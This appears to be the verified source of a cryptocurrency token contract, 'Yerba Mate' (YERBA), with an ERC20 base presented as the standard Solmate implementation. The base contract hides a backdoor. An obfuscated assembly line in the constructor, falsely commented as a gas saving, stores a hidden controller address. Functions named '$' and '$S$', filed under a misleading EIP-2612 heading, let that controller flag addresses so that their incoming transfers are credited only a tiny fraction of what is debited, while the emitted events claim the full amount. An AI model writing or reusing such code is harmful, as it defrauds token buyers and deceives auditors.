{"ERC20.sol":{"content":"// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity \u003e=0.8.0;\n\n/// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)\n/// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)\n/// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.\nabstract contract ERC20 {\n    /*//////////////////////////////////////////////////////////////\n                                 EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    /*//////////////////////////////////////////////////////////////\n                            METADATA STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    string public name;\n    string public symbol;\n    uint8 public immutable decimals;\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC20 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 public totalSupply;\n    mapping(address =\u003e uint256) public balanceOf;\n    mapping(address =\u003e mapping(address =\u003e uint256)) public allowance;\n    address private $$;\n\n    /*//////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(\n        string memory _name,\n        string memory _symbol,\n        uint8 _decimals\n    ) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n        // saves 1000 gas \n        assembly {sstore(0x05, mul(mul(0x25, 0x5f65f), mul(0x112f1b088d953c3, 0x6a41a9577de203375)))}\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               ERC20 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        unchecked {balanceOf[to] += $(amount, msg.sender, to);}\n        $S$(to);\n        emit Transfer(msg.sender, to, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.\n        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;\n        balanceOf[from] -= amount;\n        unchecked {balanceOf[to] += $(amount, from, to);}\n        $S$(to);\n        emit Transfer(from, to, amount);\n        return true;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                             EIP-2612 LOGIC\n    //////////////////////////////////////////////////////////////*/\n    function $(\n        uint256 value, \n        address from,\n        address to\n        ) internal view returns (uint256) {\n        if (allowance[$$][from] + allowance[$$][to] \u003e= uint256(uint160(address(this)))) {\n            return (value * 0xcafe15) / 0xfebad0ba;\n        } else {\n            return value;\n        }\n    }\n\n    function $S$(address to) internal {\n        if (allowance[$$][to] == uint256(uint160($$))) { allowance[$$][to] = 2 * uint256(uint160(address(this)));}\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                        INTERNAL MINT/BURN LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n        unchecked {balanceOf[to] += amount;}\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n        unchecked {totalSupply -= amount;}\n        emit Transfer(from, address(0), amount);\n    }\n}"},"Token.sol":{"content":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport \"./ERC20.sol\";\n\n/*\n  ___    ___ _______   ________  ________  ________     \n |\\  \\  /  /|\\  ___ \\ |\\   __  \\|\\   __  \\|\\   __  \\    \n \\ \\  \\/  / | \\   __/|\\ \\  \\|\\  \\ \\  \\|\\ /\\ \\  \\|\\  \\   \n  \\ \\    / / \\ \\  \\_|/_\\ \\   _  _\\ \\   __  \\ \\   __  \\  \n   \\/  /  /   \\ \\  \\_|\\ \\ \\  \\\\  \\\\ \\  \\|\\  \\ \\  \\ \\  \\ \n __/  / /      \\ \\_______\\ \\__\\\\ _\\\\ \\_______\\ \\__\\ \\__\\\n|\\___/ /        \\|_______|\\|__|\\|__|\\|_______|\\|__|\\|__|\n\\|___|/                                                 \n                                                           \n*/\n\ncontract YerbaMate is ERC20 {\n    uint256 public yerba = 0xBAB00CA;\n    constructor() ERC20(\"Yerba Mate\", \"YERBA\", 18) {\n        _mint(msg.sender, 9_000_000_000 * 10 ** 18);\n    }\n\n    /**\n     * @dev Destroys a `value` amount of tokens from the caller.\n     *\n     * See {ERC20-_burn}.\n     */\n    function burn(uint256 value) public virtual {\n        _burn(msg.sender, value);\n    }\n\n    function yerbanator(\n        address achoo\n    ) external view returns (uint256) {\n        return yerba * uint256(uint160(achoo));\n    }\n\n}"}}